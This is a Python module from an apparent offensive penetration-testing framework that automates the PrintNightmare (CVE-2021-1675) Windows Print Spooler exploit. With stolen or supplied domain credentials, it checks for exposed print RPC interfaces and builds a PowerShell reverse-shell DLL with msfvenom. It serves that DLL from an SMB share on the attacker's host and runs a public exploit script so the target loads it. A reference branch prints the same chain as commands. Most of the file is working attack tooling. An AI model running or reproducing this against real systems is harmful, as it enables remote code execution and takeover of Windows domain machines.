PROVIDES = ["exec"]
REQUIRES = ["creds"]

def run(data, cred, args):

    import subprocess
    from datetime import datetime

    from core.attacker import resolve_lhost
    from core.paths import (
        get_artifacts_dir,
        get_tools_dir,
    )
    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'
    windows = getattr(args, "windows", False)

    if windows:

        print(
            f"\n{B}┌── WINDOWS REFERENCE ─────────────────────────────┐{W}"
        )
        ip = data.get("ip")
        domain = data.get("domain")
        user = cred.get("user")
        password = cred.get("secret")
        lhost = resolve_lhost(args)


        print()

        print(f"{W}# Verify Print Spooler service{W}")
        print(f"{Y}Get-Service Spooler{W}")
        print()

        print(f"{W}# Check RPC print protocols from Linux{W}")
        print(f"{Y}rpcdump.py @{C}{ip}{Y} | findstr MS-RPRN{W}")
        print(f"{Y}rpcdump.py @{C}{ip}{Y} | findstr MS-PAR{W}")
        print()

        print(f"{W}# Generate a DLL payload (example){W}")
        print(f"{Y}msfvenom ... -f dll -o backupscript.dll{W}")
        print()

        print(f"{W}# Host the DLL over SMB{W}")
        print(f"{Y}impacket-smbserver -smb2support CompData .{W}")
        print()

        print(f"{W}# Start your listener (Netcat, Metasploit, etc.){W}")
        print()
        print(f"{W}# Run exploit.{W}")

        print(f"{Y}git clone https://github.com/cube0x0/CVE-2021-1675.git")
        print(
            f"{Y}sudo python3 CVE-2021-1675.py "
            f"{domain}/{user}:{password}@{ip} "
            f"'\\\\{lhost}\\\\CompData\\\\backupscript.dll'{W}"
        )

        print()
        print(
            f"{B}└──────────────────────────────────────────────────┘{W}\n"
        )

        return data


    #
    # Validate target / creds
    #

    if not cred:
        print(f"{R}[!] {W}No credentials selected")
        return

    ip = data.get("ip")
    domain = data.get("domain")
    hostname = data.get("hostname")
    target_name = data.get("name")

    if not ip or not domain:
        print(f"{R}[!] {W}Missing target information")
        return

    #
    # Resolve listener
    #

    lhost = resolve_lhost(args)

    if not lhost:
        print(f"{R}[!] {W}Unable to resolve LHOST")
        return

    lport = getattr(args, "lport", None) or 4444

    #
    # Paths
    #

    artifacts = get_artifacts_dir(target_name)

    dll_path = artifacts / "printnightmare.dll"

    logfile = (
        artifacts /
        f"printnightmare_{datetime.now():%Y%m%d_%H%M%S}.log"
    )

    #
    # Menu
    #

    print(
        f"\n{B}┌── PRINTNIGHTMARE ───────────────────┐{W}"
    )

    print(
        f"{B}│{W}  Select Action                    {B}│{W}"
    )

    print(
        f"{B}└─────────────────────────────────────┘{W}\n"
    )

    print(f"  {B}[1]{W} Check Exposure")
    print(f"  {B}[2]{W} PrintNightmare Exploit")

    choice = input(
        f"{Y}Select> {W}"
    ).strip()

    #
    # OPTION 1
    #

    if choice == "1":

        print(
            f"\n{B}[*]{W} Checking Print Spooler exposure...\n"
        )

        cmd = [
            "impacket-rpcdump",
            f"{domain}/{cred['user']}:{cred['secret']}@{ip}"
        ]

        print(f"{B}[*]{W} Running:{Y}")
        print(f" ".join(cmd))
        print()
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True
        )
        output = result.stdout

        if "MS-RPRN" in output:
            print(f"{G}[+] MS-RPRN exposed")

        if "MS-PAR" in output:
            print(f"{G}[+] MS-PAR exposed")

        if "MS-RPRN" not in output and "MS-PAR" not in output:
            print(f"{Y}[!] Print Spooler interfaces not found")

        logfile.write_text(output)
        return

    #
    # OPTION 2
    #

    elif choice == "2":
       
        from core.runner import run_module_by_name

        result = run_module_by_name(
            "shell.generate",
            [
                "windows/powershell/reverse",
                "--base64",
                "--lhost", lhost,
                "--lport", str(lport),
            ],
            data=data,
        )
        payload = result[0]["data"]["payload"]
        cmd = [
            "msfvenom",
            "-p", "windows/x64/exec",
            f'CMD="{payload}"',
            "-f", "dll",
            "-o", str(dll_path)
        ]

        print(f"{B}[*]{W} Building DLL...")

        subprocess.run(cmd, check=True)
        print(" ".join(cmd))

        share = input(
            f"{Y}SMB Share [{C}CompData{Y}]> {W}"
        ).strip()

        if not share:
            share = "CompData"

        

        cmd = [
            "impacket-smbserver",
            share,
            str(artifacts),
            "-smb2support"
        ]

        print(f"{B}[*]{W} Starting SMB server...")
        print(" ".join(cmd))
        server = subprocess.Popen(cmd)

        print()

        input(
            f"{Y}[?]{W} Start your listener and press Enter..."
        )

        dll = f"\\\\{lhost}\\{share}\\printnightmare.dll"
        from core.paths import get_tools_dir

        exploit = (
            get_tools_dir()
            / "PrintNightmare"
            / "CVE-2021-1675.py"
        )
        cmd = [
            "python3",
            str(exploit),
            f"{domain}/{cred['user']}:{cred['secret']}@{ip}",
            dll,
        ]

        print()

        print(f"{B}[*]{W} Executing:")
        print("  " + " ".join(cmd))
        print()

        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True
        )

        logfile.write_text(
            result.stdout +
            "\n\n================ STDERR ================\n\n" +
            result.stderr
        )

        


    # OPTION 3
    #

    elif choice == "3":

        share = input(
            f"{Y}SMB Share [{C}CompData{Y}]> {W}"
        ).strip()

        if not share:
            share = "CompData"

        print()

        #
        # TODO:
        #
        # 1.
        # Generate DLL
        #
        # 2.
        # Launch smbserver
        #
        # 3.
        # Prompt user to start listener
        #
        # 4.
        # Execute PrintNightmare exploit
        #
        # 5.
        # Capture stdout
        #
        # 6.
        # Save logfile
        #

        print(
            f"{G}[+] {W}Workflow complete (placeholder)\n"
        )

        print(
            f"Artifacts:\n"
        )

        print(
            f"  DLL : {dll_path}"
        )

        print(
            f"  Log : {logfile}"
        )

        return
